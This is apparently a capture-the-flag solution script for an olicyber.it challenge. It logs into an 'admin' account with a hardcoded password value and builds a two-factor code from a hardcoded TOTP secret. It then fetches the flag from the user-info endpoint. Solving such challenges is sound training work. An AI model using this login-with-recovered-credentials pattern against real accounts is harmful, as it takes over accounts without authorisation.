import requests, json

session = requests.Session()

URL ='http://securelogin.challs.olicyber.it/'

r = session.post(URL+'login', json={'username': 'admin', 'password': '5d08a95e13ee227fb04dfb425bcc690176a9680e1bc8192b7d55db57f3d9a38b'})

code = input('Get code from authenticator app at otpauth://totp/admin@securecorp.it?secret=MNRWGNLUOJWDOZD2&period=30 : ')

session.get(URL+'2fa?code='+code)



r = session.get(URL+'user-info')
print(json.loads(r.text)['flag'])  
